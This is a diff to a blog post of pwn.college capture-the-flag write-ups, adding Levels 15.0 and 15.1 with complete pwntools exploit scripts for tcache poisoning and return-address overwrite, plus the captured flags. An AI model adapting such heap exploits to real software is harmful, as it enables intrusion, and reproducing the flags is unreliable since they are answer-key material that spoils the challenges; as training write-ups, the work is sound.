@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Dynamic Allocator Misuse) series"
 published: 2025-09-08
-updated: 2025-10-04
+updated: 2025-10-07
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.41yct5dsj8.avif"
 tags: ["Pwn", "Write-ups", "Heap"]
@@ -3328,3 +3328,254 @@ if __name__ == "__main__":
 ## Flag
 
 :spoiler[`pwn.college{89yuVXIylEt3d84DgpKZsDAT2ew.0FO5MDL5cTNxgzW}`]
+
+# Level 15.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to obtain the flag.
+
+## Write-up
+
+UAF 被 ban 又怎样？照样拿捏。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level15.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def echo(idx, offset):
+    target.sendlineafter(b": ", b"echo")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Offset: ", str(offset).encode())
+
+
+def read(idx, size):
+    target.sendlineafter(b": ", b"read")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0)
+    echo(0, 0x28)
+
+    target.recvuntil(b"Data: ")
+    stack = int.from_bytes(target.recvline().strip(), "little")
+    main_ret_addr = stack + 0x176
+
+    echo(0, 0x50)
+    target.recvuntil("Data: ")
+    pie = int.from_bytes(target.recvline().strip(), "little") - 0x33F8
+    win = pie + elf.sym["win"]
+
+    target.success(f"stack: {hex(stack)}")
+    target.success(f"pie: {hex(pie)}")
+    target.success(f"win: {hex(win)}")
+
+    malloc(0, 0)
+    malloc(1, 0)
+    malloc(2, 0)
+    free(2)
+    free(1)
+    # raw_input("DEBUG")
+    read(0, 0x1337)
+
+    payload = flat(
+        b"A" * 0x20,
+        main_ret_addr,
+    )
+    target.sendline(payload)
+
+    malloc(0, 0)
+    # raw_input("DEBUG")
+    malloc(0, 0)
+
+    read(0, 0x1337)
+    target.sendline(p64(win))
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{QyYR-Pj8vuLZgMayMcB0QHW1DKk.0VO5MDL5cTNxgzW}`]
+
+# Level 15.1
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Leverage TCACHE exploits to obtain the flag.
+
+## Write-up
+
+参见 [Level 15.0](#level-150)。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import (
+    args,
+    context,
+    flat,
+    p64,
+    process,
+    raw_input,
+    remote,
+)
+
+
+FILE = "/challenge/babyheap_level15.1"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def malloc(idx, size):
+    target.sendlineafter(b": ", b"malloc")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def free(idx):
+    target.sendlineafter(b": ", b"free")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+
+
+def echo(idx, offset):
+    target.sendlineafter(b": ", b"echo")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Offset: ", str(offset).encode())
+
+
+def read(idx, size):
+    target.sendlineafter(b": ", b"read")
+    target.sendlineafter(b"Index: ", str(idx).encode())
+    target.sendlineafter(b"Size: ", str(size).encode())
+
+
+def quit():
+    target.sendlineafter(b": ", b"quit")
+
+
+def launch():
+    global target
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+
+def main():
+    launch()
+
+    malloc(0, 0)
+    echo(0, 0x28)
+
+    target.recvuntil(b"Data: ")
+    stack = int.from_bytes(target.recvline().strip(), "little")
+    main_ret_addr = stack + 0x176
+
+    raw_input("DEBUG")
+    echo(0, 0x50)
+    target.recvuntil("Data: ")
+    pie = int.from_bytes(target.recvline().strip(), "little") - 0x2110
+    win = pie + elf.sym["win"]
+
+    target.success(f"stack: {hex(stack)}")
+    target.success(f"pie: {hex(pie)}")
+    target.success(f"win: {hex(win)}")
+
+    malloc(0, 0)
+    malloc(1, 0)
+    malloc(2, 0)
+    free(2)
+    free(1)
+    # raw_input("DEBUG")
+    read(0, 0x1337)
+
+    payload = flat(
+        b"A" * 0x20,
+        main_ret_addr,
+    )
+    target.sendline(payload)
+
+    malloc(0, 0)
+    # raw_input("DEBUG")
+    malloc(0, 0)
+
+    read(0, 0x1337)
+    target.sendline(p64(win))
+    quit()
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+:spoiler[`pwn.college{sqd-yJZ1_DJOrzpwErrz-Y_4Jw1.0FMwQDL5cTNxgzW}`]
